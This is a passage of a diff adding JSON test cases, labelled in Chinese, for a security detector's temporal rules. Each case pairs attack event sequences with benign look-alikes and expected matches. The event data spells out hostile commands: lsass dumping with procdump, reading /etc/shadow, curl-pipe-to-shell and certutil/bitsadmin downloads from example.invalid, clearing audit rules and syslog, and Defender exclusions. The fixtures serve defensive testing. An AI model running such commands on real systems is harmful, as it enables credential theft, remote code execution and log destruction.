+            "ip": "10.0.0.8",
+            "port": 51234
+          },
+          "dst_endpoint": {
+            "ip": "192.0.2.10",
+            "port": 4444
+          },
+          "process": {
+            "name": "python3"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:credential-dump-suspicious-outbound",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "Windows 转储 lsass 后外联 4444 端口",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "procdump.exe",
+            "file": {
+              "path": "C:\\Tools\\procdump.exe"
+            },
+            "cmd_line": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\l.dmp"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 4001,
+        "raw": {
+          "activity_id": 1,
+          "connection_info": {
+            "direction": "outbound",
+            "protocol_name": "tcp"
+          },
+          "src_endpoint": {
+            "ip": "10.0.0.8",
+            "port": 51234
+          },
+          "dst_endpoint": {
+            "ip": "192.0.2.10",
+            "port": 4444
+          },
+          "process": {
+            "name": "rundll32.exe"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:credential-dump-suspicious-outbound",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "排查账号读取影子库，二十分钟后才有高危端口外联",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /etc/shadow"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 1210,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 4001,
+        "raw": {
+          "activity_id": 1,
+          "connection_info": {
+            "direction": "outbound",
+            "protocol_name": "tcp"
+          },
+          "src_endpoint": {
+            "ip": "10.0.0.8",
+            "port": 51234
+          },
+          "dst_endpoint": {
+            "ip": "192.0.2.10",
+            "port": 4444
+          },
+          "process": {
+            "name": "python3"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "禁用命令历史后管道执行",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "sh -c unset HISTFILE; export HISTSIZE=0"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-history-tamper-download-exec",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "镜像构建脚本先安装后清历史",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash -c history -c && rm -rf /tmp/*"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "清空审计规则后管道执行",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "auditctl",
+            "file": {
+              "path": "/usr/sbin/auditctl"
+            },
+            "cmd_line": "auditctl -D"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-audit-rules-cleared-download-exec",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "augenrules 加载审计规则后执行安装脚本",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "auditctl",
+            "file": {
+              "path": "/usr/sbin/auditctl"
+            },
+            "cmd_line": "auditctl -R /etc/audit/audit.rules"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "清空 syslog 后管道执行",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "truncate",
+            "file": {
+              "path": "/usr/bin/truncate"
+            },
+            "cmd_line": "truncate -s 0 /var/log/syslog"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-syslog-cleared-download-exec",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "安装后清理 journal 腾磁盘",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 100,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "journalctl",
+            "file": {
+              "path": "/usr/bin/journalctl"
+            },
+            "cmd_line": "journalctl --vacuum-size=200M"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "停防火墙后从 /dev/shm 执行程序",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systemctl",
+            "file": {
+              "path": "/usr/bin/systemctl"
+            },
+            "cmd_line": "systemctl stop firewalld"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "kworker",
+            "file": {
+              "path": "/dev/shm/.x/kworker"
+            },
+            "cmd_line": "/dev/shm/.x/kworker -c /dev/shm/.x/config.json"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-security-disabled-shm-exec",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "按 k3s 安装文档关 SELinux 与防火墙后 curl 安装",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "setenforce",
+            "file": {
+              "path": "/usr/sbin/setenforce"
+            },
+            "cmd_line": "setenforce 0"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systemctl",
+            "file": {
+              "path": "/usr/bin/systemctl"
+            },
+            "cmd_line": "systemctl stop firewalld"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -sfL https://get.k3s.io | sh -"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "certutil 下载后写入 Run 自启动",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "certutil.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe"
+            },
+            "cmd_line": "certutil -urlcache -split -f http://example.invalid/a.exe C:\\Users\\Public\\a.exe"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 201002,
+        "raw": {
+          "activity_id": 1,
+          "reg_key": {
+            "path": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+          },
+          "reg_value": {
+            "data": "C:\\Users\\Public\\a.exe"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:windows-lolbin-download-autostart",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "软件安装写入 Run 自启动但没有 LOLBin 下载",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "msiexec.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\msiexec.exe"
+            },
+            "cmd_line": "msiexec.exe /i C:\\Users\\ops\\Downloads\\agent.msi /qn"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 201002,
+        "raw": {
+          "activity_id": 1,
+          "reg_key": {
+            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\VendorAgent"
+          },
+          "reg_value": {
+            "data": "C:\\Program Files\\Vendor\\agent.exe"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "bitsadmin 下载后新建计划任务",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bitsadmin.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\bitsadmin.exe"
+            },
+            "cmd_line": "bitsadmin /transfer job http://example.invalid/a.exe C:\\Users\\Public\\a.exe"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 45,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 1,
+          "file": {
+            "path": "C:\\Windows\\System32\\Tasks\\WindowsUpdateCheck"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:windows-lolbin-download-scheduled-task",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "Office 自动更新改写计划任务",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 3,
+          "file": {
+            "path": "C:\\Windows\\System32\\Tasks\\Microsoft\\Office\\Office Automatic Updates 2.0"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "添加 Defender 排除项后 certutil 下载",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 201002,
+        "raw": {
+          "activity_id": 1,
+          "reg_key": {
+            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public"
+          },
+          "reg_value": {
+            "data": "0"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "certutil.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe"
+            },
+            "cmd_line": "certutil -urlcache -split -f http://example.invalid/a.exe C:\\Users\\Public\\a.exe"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:windows-defender-exclusion-lolbin-download",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "备份软件加排除项后用 certutil 校验安装包哈希",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 201002,
+        "raw": {
+          "activity_id": 1,
+          "reg_key": {
+            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Program Files\\Veeam"
+          },
+          "reg_value": {
+            "data": "0"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "certutil.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe"
+            },
+            "cmd_line": "certutil -hashfile C:\\Users\\ops\\Downloads\\veeam.iso SHA256"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "排除项快照晚于下载上报不命中（已知缺口）",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "certutil.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe"
+            },
+            "cmd_line": "certutil -urlcache -split -f http://example.invalid/a.exe C:\\Users\\Public\\a.exe"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 35,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 201002,
+        "raw": {
+          "activity_id": 1,
+          "reg_key": {
+            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public"
+          },
+          "reg_value": {
+            "data": "0"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "Windows 两分钟内六次侦察命令",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\whoami.exe"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ipconfig.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\ipconfig.exe"
+            },
+            "cmd_line": "ipconfig /all"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systeminfo.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\systeminfo.exe"
+            },
+            "cmd_line": "systeminfo"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "netstat.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\netstat.exe"
+            },
+            "cmd_line": "netstat -ano"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "nltest.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\nltest.exe"
+            },
+            "cmd_line": "nltest /dclist:"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "arp.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\arp.exe"
+            },
+            "cmd_line": "arp -a"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:windows-recon-burst",
+        "anchor": "6",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "6"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "资产盘点每十分钟执行 ipconfig 与 systeminfo",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 0,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ipconfig.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\ipconfig.exe"
+            },
+            "cmd_line": "ipconfig /all"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 5,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systeminfo.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\systeminfo.exe"
+            },
+            "cmd_line": "systeminfo"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 600,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ipconfig.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\ipconfig.exe"
+            },
+            "cmd_line": "ipconfig /all"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 605,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systeminfo.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\systeminfo.exe"
+            },
+            "cmd_line": "systeminfo"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 1200,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ipconfig.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\ipconfig.exe"
+            },
+            "cmd_line": "ipconfig /all"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 1205,
+        "group": "A",
+        "asset": "host-1",
+        "os": "windows",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "systeminfo.exe",
+            "file": {
+              "path": "C:\\Windows\\System32\\systeminfo.exe"
+            },
+            "cmd_line": "systeminfo"
+          }
+        }
+      }
+    ],
+    "matches": []
   }
 ]
